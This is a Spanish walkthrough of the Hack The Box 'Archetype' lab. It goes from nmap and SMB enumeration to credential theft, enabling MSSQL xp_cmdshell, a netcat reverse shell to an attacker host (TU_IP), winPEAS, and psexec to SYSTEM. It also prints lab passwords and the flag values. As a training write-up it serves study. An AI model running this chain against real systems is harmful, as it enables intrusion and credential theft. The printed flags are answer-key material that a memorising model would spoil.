![Mi imagen](/archetype/Archetype.png)

# HTB Archetype – Writeup Completo
## 1. Verificación de conectividad

Comenzamos verificando la conectividad con la máquina objetivo mediante ping.

```js
ping -c 1 10.129.95.187
```

Esto confirma que tenemos comunicación con la máquina.


## 2. Escaneo de puertos

Realizamos un escaneo completo de puertos:

```js
sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 10.129.95.187 -oG allPorts
```
![Mi imagen](/archetype/2.jpeg)

Puertos encontrados:

**135, 139, 445, 1433, 5985, 47001, 49664, 49665, 49666, 49667, 49668, 49669**

Luego analizamos servicios:

```js
nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.129.95.187 -oN target
```
![Mi imagen](/archetype/1.jpeg)


## 3. Enumeración SMB

Dado que SMB está abierto, enumeramos recursos compartidos:

```js
smbclient -L //10.129.95.187 -N
```

Encontramos el recurso:

backups

![Mi imagen](/archetype/5.jpeg)

## 4. Acceso al recurso compartido

Accedemos al recurso:

```js
smbclient //10.129.95.187/backups -N
```

Listamos archivos:

ls

Descargamos el archivo:

get prod.dtsConfig

Este archivo contiene credenciales en texto plano:

User ID=ARCHETYPE\sql_svc
Password=M3g4c0rp123
## 5. Acceso a MSSQL

Dado que el puerto 1433 está abierto, nos conectamos con Impacket:

```js
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.28.255 -windows-auth
```

![Mi imagen](/archetype/6.jpeg)

## 6. Habilitar ejecución de comandos

Activamos xp_cmdshell:

```js
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```
```js
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Ejecutamos:

```js
EXEC xp_cmdshell 'whoami';
```

Resultado:

archetype\sql_svc
## 7. Reverse Shell con Netcat

Descargamos nc64.exe desde nuestro servidor:

```js
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://TU_IP:8000/nc64.exe -OutFile C:\Users\Public\nc64.exe"';
```


En nuestra máquina:

```js
nc -lvnp 443
```

Ejecutamos:

```js
EXEC xp_cmdshell 'C:\Users\Public\nc64.exe -e cmd.exe TU_IP 443';
```


## 8. Obtención de user flag

Navegamos:

```js
cd C:\Users\Administrator\Desktop
dir
type user.txt
```

![Mi imagen](/archetype/4.jpeg)


## 9. Escalada de privilegios con winPEAS

Descargamos winPEAS:
```js
powershell -c "Invoke-WebRequest http://TU_IP:8000/winPEASany.exe -OutFile C:\Users\Public\winPEAS.exe"
```
Ejecutamos:
```js
C:\Users\Public\winPEAS.exe
```

## 10. Descubrimiento de credenciales

winPEAS nos guía a:

```js
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
Leemos el archivo:
```js
type ConsoleHost_history.txt
```
Contenido clave:
```js
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

## 11. Acceso como Administrator

Usamos Impacket:
```js
impacket-psexec 'ARCHETYPE/Administrator:MEGACORP_4dm1n!!@10.129.28.255'
```

Verificamos:

whoami

Resultado:

nt authority\system
## 12. Obtención de root flag
```
type C:\Users\Administrator\Desktop\root.txt
```

### Flags
**User flag:** *3e7b102e78218e935bf3f4951fec21a3*  
**Root flag:** *b91ccec3305e98240082d4474b848528*

### Conclusión

**Este laboratorio demuestra:**

1) Mala gestión de credenciales en archivos de configuración
2) Reutilización de contraseñas
3) Riesgos de xp_cmdshell
4) Importancia de la enumeración post-explotación

![Mi imagen](/archetype/3.jpeg)
